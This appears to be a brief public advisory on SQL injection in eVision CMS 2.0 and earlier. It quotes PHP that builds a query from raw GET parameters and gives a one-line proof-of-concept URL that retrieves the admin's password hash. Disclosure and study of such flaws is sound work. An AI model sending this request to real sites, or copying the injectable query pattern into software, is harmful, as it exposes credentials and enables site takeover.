eVision CMS <= 2.0 (field) SQL Injection Vulnerability
======================================================


--+++============================================================+++--
--+++====== eVision CMS <= 2.0 SQL Injection Vulnerability ======+++--
--+++============================================================+++--

[+] Author  : darkjoker
[+] Download: http://kent.dl.sourceforge.net/sourceforge/e-vision/eVision-2.0.tar.gz

[+] Vulnerable code:

    67  $sql = "SELECT `".$_GET[&#039;field&#039;]."` FROM ".$_GET[&#039;module&#039;]." WHERE `id".$_GET[&#039;module&#039;]."`=&#039;".$_GET[&#039;id&#039;]."&#039;";
    68  $result = mysql_query($sql);
    69  $row = mysql_fetch_array($result);
    70
    71  if ( isset($_GET[&#039;div&#039;]) ) { $div = &#039;class="&#039;.$_GET[&#039;div&#039;].&#039;"&#039;; }
    72  else { $div = &#039;&#039;; }
    73  if ( isset($_GET[&#039;font&#039;]) ) { $font = &#039;class="&#039;.$_GET[&#039;font&#039;].&#039;"&#039;; }
    74  else { $font = &#039;&#039;; }
    75
    76  echo &#039;
    77  <html &#039;.$div.&#039;>
    78  <head>
    79          <meta http-equiv="Content-Type" content="text/html; charset=&#039;.$charset.&#039;">
    80          <link rel="stylesheet" type="text/css" href="&#039;.$path.&#039;style.php?template=&#039;.$template.&#039;&module=&#039;.$_GET[&#039;module&#039;].&#039;">
    81  </head>
    82  <body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0" &#039;.$font.&#039;>&#039;.set_text($row[$_GET[&#039;field&#039;]]).&#039;</body>
    83  </html>
    84  &#039;;


[+] It prints admin&#039;s password (hashed):

[+] /iframe.php?field=pass&module=users&id=1



